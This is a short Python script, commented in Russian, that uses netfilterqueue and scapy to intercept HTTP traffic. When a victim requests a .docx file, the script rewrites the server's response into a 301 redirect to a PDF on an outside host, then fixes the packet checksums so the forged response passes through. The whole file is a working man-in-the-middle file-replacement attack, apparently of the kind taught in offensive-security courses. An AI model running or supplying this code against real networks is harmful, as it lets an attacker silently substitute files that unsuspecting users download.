#!usr/bin/env python
#coding: utf8
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			# print("HTTP Request (запрос)")
			if ".docx" in scapy_packet[scapy.Raw].load:
				print("[+] .docx Request (запрос)")
				ack_list.append(scapy_packet[scapy.TCP].ack)
				# print(scapy_packet.show())
		elif scapy_packet[scapy.TCP].sport == 80:
			# print("HTTP Response (ответ)")
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file (замена)")
				# print(scapy_packet.show())
				scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://nsagov.ru/Content/Docs/%D0%9F%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%20%D0%BE%D0%B1%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%BA%D0%B8%20%D0%BF%D0%B5%D1%80%D1%81%D0%BE%D0%BD%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D1%85%20%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85.pdf\n\n"

				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.TCP].chksum
				packet.set_payload(str(scapy_packet))

	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()